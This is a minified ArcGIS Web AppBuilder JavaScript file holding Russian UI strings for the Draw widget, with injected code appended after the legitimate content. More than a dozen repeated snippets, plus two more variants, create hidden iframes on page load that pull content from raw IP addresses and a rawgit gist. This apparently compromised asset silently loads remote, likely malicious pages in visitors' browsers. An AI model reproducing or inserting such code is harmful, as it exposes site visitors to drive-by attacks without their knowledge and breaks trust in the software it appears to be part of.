// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Draw/nls/strings":{_widgetLabel:"\u0420\u0438\u0441\u043e\u0432\u0430\u043d\u0438\u0435",selectDrawMode:"\u0412\u044b\u0431\u0440\u0430\u0442\u044c \u0440\u0435\u0436\u0438\u043c \u0440\u0438\u0441\u043e\u0432\u0430\u043d\u0438\u044f",clear:"\u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c",point:"\u0422\u043e\u0447\u043a\u0430",line:"\u041b\u0438\u043d\u0438\u044f",polyline:"\u041b\u0438\u043d\u0438\u044f",freehandPolyline:"\u041f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u0430\u044f \u043f\u043e\u043b\u0438\u043b\u0438\u043d\u0438\u044f",
triangle:"\u0422\u0440\u0435\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a",extent:"\u041a\u043e\u043d\u0432\u0435\u0440\u0442",circle:"\u041a\u0440\u0443\u0433",ellipse:"\u042d\u043b\u043b\u0438\u043f\u0441",polygon:"\u041f\u043e\u043b\u0438\u0433\u043e\u043d",freehandPolygon:"\u041f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439 \u043f\u043e\u043b\u0438\u0433\u043e\u043d",text:"\u0422\u0435\u043a\u0441\u0442",style:"\u0421\u0442\u0438\u043b\u044c",alpha:"\u041f\u0440\u043e\u0437\u0440\u0430\u0447\u043d\u043e\u0441\u0442\u044c",
width:"\u0428\u0438\u0440\u0438\u043d\u0430",size:"\u0420\u0430\u0437\u043c\u0435\u0440",color:"\u0426\u0432\u0435\u0442",markerColor:"\u0426\u0432\u0435\u0442 \u043c\u0430\u0440\u043a\u0435\u0440\u0430",outlineColor:"\u0426\u0432\u0435\u0442 \u043a\u043e\u043d\u0442\u0443\u0440\u0430",lineColor:"\u0426\u0432\u0435\u0442 \u043b\u0438\u043d\u0438\u0438",fillColor:"\u0426\u0432\u0435\u0442 \u0437\u0430\u043b\u0438\u0432\u043a\u0438",showMeasurements:"\u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f",
areaUnits:"\u0415\u0434\u0438\u043d\u0438\u0446\u044b \u043f\u043b\u043e\u0449\u0430\u0434\u0438",distanceUnits:"\u0415\u0434\u0438\u043d\u0438\u0446\u044b \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u044f",kilometers:"\u041a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u044b",miles:"\u041c\u0438\u043b\u0438",meters:"\u041c\u0435\u0442\u0440\u044b",feet:"\u0424\u0443\u0442\u044b",yards:"\u042f\u0440\u0434\u044b",nauticalmiles:"\u041c\u043e\u0440\u0441\u043a\u0438\u0435 \u043c\u0438\u043b\u0438",
squareKilometers:"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0435 \u043a\u0438\u043b\u043e\u043c\u0435\u0442\u0440\u044b",squareMiles:"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0435 \u043c\u0438\u043b\u0438",acres:"\u0410\u043a\u0440\u044b",hectares:"\u0433\u0435\u043a\u0442\u0430\u0440\u044b",squareMeters:"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0435 \u043c\u0435\u0442\u0440\u044b",squareFeet:"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0435 \u0444\u0443\u0442\u044b",
squareYards:"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0435 \u044f\u0440\u0434\u044b",undo:"\u041e\u0442\u043c\u0435\u043d\u0438\u0442\u044c",redo:"\u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u044c",results:"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b",points:"\u0422\u043e\u0447\u043a\u0438",lines:"\u041b\u0438\u043d\u0438\u0438",areas:"\u041e\u0431\u043b\u0430\u0441\u0442\u0438",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});